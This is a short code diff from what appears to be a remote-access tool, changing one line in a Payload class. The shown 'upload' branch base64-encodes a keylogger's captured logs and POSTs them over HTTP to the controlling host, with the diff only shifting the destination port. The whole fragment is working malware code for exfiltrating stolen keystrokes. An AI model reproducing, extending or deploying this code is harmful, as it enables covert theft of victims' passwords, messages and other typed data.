@@ -858,7 +858,7 @@ class Payload():
             elif 'upload' in mode:
                 data = base64.b64encode(globals()['keylogger'].logs.getvalue())
                 host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port), json={'data': data})
+                globals()['post']('http://{}:{}'.format(host, port + 3), json={'data': data})
                 globals()['keylogger'].logs.reset()
                 return 'Upload complete'
             elif 'status' in mode:
